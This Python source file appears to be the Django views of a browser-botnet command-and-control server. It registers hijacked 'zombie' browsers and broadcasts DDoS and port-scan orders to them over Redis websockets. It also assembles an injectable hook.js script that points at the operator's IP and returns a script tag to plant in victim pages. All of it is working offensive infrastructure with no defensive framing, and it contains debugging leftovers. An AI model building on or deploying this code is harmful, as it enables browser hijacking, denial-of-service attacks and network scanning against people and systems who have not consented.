from django.shortcuts import render

# Create your views here.
from ws4redis.publisher import RedisPublisher
from ws4redis.redis_store import RedisMessage
from django.views.generic.base import View,TemplateResponseMixin,ContextMixin
from rest_framework import viewsets

from rest_framework.views import APIView
from rest_framework.permissions import IsAuthenticated

from .models import Zombie,Attacker
from rest_framework.response import Response
from rest_framework.decorators import list_route
import pdb
import simplejson
from django.http import HttpResponse
import os


Zombies = []


class ZombieConnection(View):

    global Zombies
    def get(self,request,**kwargs):


        try:
            zom = Zombie.objects.get(host=request.META['HTTP_HOST'])
        except Zombie.DoesNotExist:
            newZombie = Zombie.objects.create(host=request.META['HTTP_HOST'])

            redis_publisher = RedisPublisher(facility='attacker',sessions=[Attacker.objects.all()[0].sesskey])
            redis_publisher.publish_message(RedisMessage(simplejson.dumps({'newzombieId':newZombie.pk,'newzombieHost':newZombie.host})))
        if not request.session.exists(request.session.session_key):
            request.session.create()
        zom = Zombie.objects.get(host=request.META['HTTP_HOST'])
        zom.sesskey = request.session.session_key
        zom.save()
        Zombies.append(zom)




        response=HttpResponse(simplejson.dumps("{'lol':lol'};"),'application/json')

        return response


class IndexPage(View,TemplateResponseMixin,ContextMixin):
        template_name='index.html'
        def get_context_data(self, **kwargs):
            context = super(IndexPage,self).get_context_data(**kwargs)
            context['zombies'] = Zombie.objects.all()
            return context
        def get(self,request):

            if not request.session.exists(request.session.session_key):
                    request.session.create()
                    Attacker.objects.create(sesskey=request.session.session_key)

            else:

                try:
                    Attacker.objects.get(sesskey=request.session.session_key)

                except Attacker.DoesNotExist:
                    Attacker.objects.create(sesskey=request.session.session_key)



            return self.render_to_response(self.get_context_data())


class ZombieControl(viewsets.ModelViewSet):

    @list_route(methods=['post'])
    def DDOS(self,request,pk=None):

        target = request.data['targetip']

        redis_publisher = RedisPublisher(facility='broadcastcontrol',broadcast=True)

        respData = {'attacktype':'ddos','attackInfo':{'targetip':target}}
        redis_publisher.publish_message(RedisMessage(simplejson.dumps(respData)))
        return Response({'ack':'ddos'})

    @list_route(methods=['post'])
    def Cancel(self,request,pk=None):

        if 'zombie'not in request.data:
            redis_publisher = RedisPublisher(facility='broadcastcontrol',broadcast=True)

            respData = {'stopattack':'true'}
            redis_publisher.publish_message(RedisMessage(simplejson.dumps(respData)))

        else:

            zom = Zombie.objects.get(host=request.data['zombie'])

            redis_publisher = RedisPublisher(facility='solo',sessions=[zom.sesskey])
                    #send to url to websocket
            redis_publisher.publish_message(RedisMessage(simplejson.dumps({'stopattack':'true'})))


        return Response({'ack':'canceled'})
    @list_route(methods=['post'])
    def PORTSCAN(self,request,pk=None):
        target = request.data['targetnet']+":2000"
        #print(Zombie.objects.all()[0].host)
        pdb.set_trace()
        try:
            redis_publisher = RedisPublisher(facility='solo', sessions=[Zombie.objects.get(host=target).sesskey])
            redis_publisher.publish_message(RedisMessage(simplejson.dumps({'attacktype':'portscan','attackInfo':{}})))
        except Zombie.DoesNotExist:
            return Response({'failed':'failed'})

        return Response({'ack':'portscan'})
    @list_route(methods=['get'])
    def responds(self,request,pk=None):

        redis_publisher = RedisPublisher(facility='attacker',sessions=[Attacker.objects.all()[0].sesskey])
        redis_publisher.publish_message(RedisMessage(simplejson.dumps({'host':request.GET['host']})))

        return HttpResponse()


class InjectionCreate(View):
        def post(self,request,**kwargs):
            ip = request.POST['server_ip']



            #add ws redis
            wsredis = ""

            try:
                with open(os.getcwd()+"/ccstation/static/ws4redis.min.js","r") as f:
                    wsredis = f.read()
            except IOError as e:
                print(e)
                return HttpResponse("Faild to setup hook script:"+e)

            #add jquery min
            jquery =""
            try:
                with open(os.getcwd()+"/ccstation/static/jquery.min.js","r") as f:
                    jquery = f.read()
            except IOError as e:
                print(e)
                return HttpResponse("Failed to setup hook script: "+e)

            headers = wsredis+jquery
            #server ip
            ipstr = 'var ip = "{ipaddress}";'
            #get injection script
            injection = open(os.getcwd()+"/ccstation/static/protohook.js").read()
            #format for user
            injection = headers+ipstr.format(ipaddress=ip)+injection


            #attempt to create injection script
            try:
                with open(os.getcwd()+"/hook.js",'w+') as f:
                        f.write(injection)
                        return HttpResponse(simplejson.dumps({'resp':"src=\"http://"+ip+"/2000/hook.js\""}),content_type='application/json')
            except IOError as e:
                print(e)
                return HttpResponse(e)
